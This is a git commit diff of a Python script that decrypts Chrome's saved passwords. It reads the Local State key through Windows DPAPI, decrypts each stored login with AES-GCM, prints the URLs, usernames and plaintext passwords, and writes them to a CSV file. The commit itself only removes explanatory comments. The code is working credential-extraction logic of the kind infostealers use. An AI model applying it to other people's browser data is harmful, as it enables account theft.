e8752a29d669b9e05e9376195b750eb62f5d7d1c
Vaibhav Kumar <60957669+vkvbit@users.noreply.github.com>
2023-07-02 14:34:24 +0530

    Update app.py

--- app.py
+++ app.py
@@ -10,20 +10,17 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 
-working_directory = os.getcwd()
 
-#GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(input("enter path of local state: "))
 CHROME_PATH_LOGIN_DATA = os.path.normpath(input("enter path of login data: "))
 
 def get_secret_key():
-    try:
-        #(1) Get secretkey from chrome local state
+    try:        
         with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        #Remove suffix DPAPI
+        
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
@@ -39,13 +36,11 @@ def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
 
 def decrypt_password(ciphertext, secret_key):
-    try:
-        #(3-a) Initialisation vector for AES decryption
+    try:        
         initialisation_vector = ciphertext[3:15]
-        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-        #Encrypted password is 192 bits
+        
         encrypted_password = ciphertext[15:-16]
-        #(4) Build the cipher to decrypt the ciphertext
+        
         cipher = generate_cipher(secret_key, initialisation_vector)
         decrypted_pass = decrypt_payload(cipher, encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
@@ -67,14 +62,13 @@ def get_db_connection(chrome_path_login_db):
         
 if __name__ == '__main__':
     try:
-        #Create Dataframe to store passwords
         with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
-            #(1) Get secret key
+            
             secret_key = get_secret_key()
             
-            #(2) Get ciphertext from sqlite database
+            
             chrome_path_login_db = CHROME_PATH_LOGIN_DATA
             conn = get_db_connection(chrome_path_login_db)
             if(secret_key and conn):
@@ -85,18 +79,17 @@ if __name__ == '__main__':
                     username = login[1]
                     ciphertext = login[2]
                     if(url!="" and username!="" and ciphertext!=""):
-                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                        #(4) Use AES algorithm to decrypt the password
+                        
                         decrypted_password = decrypt_password(ciphertext, secret_key)
                         print("Sequence: %d"%(index))
                         print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                         print("*"*50)
-                        #(5) Save into CSV 
+                        
                         csv_writer.writerow([index,url,username,decrypted_password])
-                #Close database connection
+                
                 cursor.close()
                 conn.close()
-                #Delete temp login db
+                
                 os.remove("Loginvault.db")
     except Exception as e:
         print("[ERR] %s"%str(e))
